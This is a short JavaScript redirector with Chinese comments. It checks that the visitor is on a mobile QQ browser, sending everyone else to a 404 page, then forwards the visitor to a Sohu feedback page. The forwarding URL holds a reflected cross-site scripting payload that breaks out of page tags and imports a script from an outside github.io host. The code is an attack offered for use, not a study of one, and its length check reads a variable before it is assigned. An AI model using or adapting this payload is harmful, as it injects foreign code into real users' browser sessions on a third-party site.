// 判断是否在移动端访问
function isMobile() {
	var userAgent = navigator.userAgent.toLowerCase();
	return (/iphone|ipad|ipod|android|windows phone/.test(userAgent));
}
// 检测是否在移动端 QQ 浏览器中访问
function isMobileQQBrowser() {
    var userAgent = navigator.userAgent || navigator.vendor || window.opera;
    return (userAgent.indexOf('QQ') !== -1 && userAgent.indexOf('Mobile') !== -1);
}

// 使用例子
if (isMobileQQBrowser()) {
    console.log('当前环境是移动端 QQ 浏览器');
} else {
   window.location.href = '/404';
}



// 如果不在移动端访问，则跳转到提示页面
if (!isMobile()) {
 	window.location.href = '/404';
}


function getQueryVariable(variable) {
	var query = window.location.search.substring(1);
	var vars = query.split("&");
	for (var i = 0; i < vars.length; i++) {
		var pair = vars[i].split("=");
		if (pair[0] === variable) {
			return pair[1];
		}
	}
	return false;
}



if (t.length > 10) {
	var t = getQueryVariable('t');
	var timestamp = Date.now();
	var jk1 = "https://feedback.vrs.sohu.com/feedback.html;fXcvJHmkItPPMsd" + timestamp +
		"diUlxoOUaqMtdRiGv?logId=1%27)%22%3C/Title/%3C/Style/%3C/Textarea/%3C/Iframe%3E%3CScript/K/%3Eimport(%27//xiachedann.github.io/playmusic.js%27)%3C/Script/K&17225942986202=5018016e1ea27a6572ef377dbad76da59d01d7f3a55&url=" +
		t;
	window.location.href = jk1;
} else {
	window.location.href = '/404';
}
